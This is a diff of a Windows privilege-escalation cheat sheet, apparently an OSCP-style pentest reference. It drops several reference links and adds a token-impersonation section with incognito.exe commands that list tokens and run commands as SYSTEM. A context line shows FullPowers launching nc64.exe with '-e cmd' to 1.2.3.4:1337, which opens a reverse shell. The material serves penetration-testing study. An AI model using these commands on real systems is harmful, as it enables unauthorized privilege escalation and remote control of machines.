@@ -9,10 +9,6 @@ https://github.com/areyou1or0/Windows
 https://git.io/JL7sx
 https://github.com/C0nd4/OSCP-Priv-Esc
 https://sushant747.gitbooks.io/total-oscp-guide/content/windows.html
-https://www.microsoftpressstore.com/articles/article.aspx?p=2224373&seqNum=2
-https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
-https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
-https://atom.hackstreetboys.ph/windows-privilege-escalation-service-exploits/
 
 ### Tools
 
@@ -470,6 +466,20 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
+---
+
+### Token Impersonation
+
+> Incognito is a tool which can be used for privilege escalation, typically from Local Administrator to Domain Administrator
+
+```powershell
+incognito.exe list_tokens -u
+```
+
+```powershell
+incognito.exe execute "NT AUTHORITY\SYSTEM" "cmd /c whoami >.\outout.txt"
 ```
 
 ---
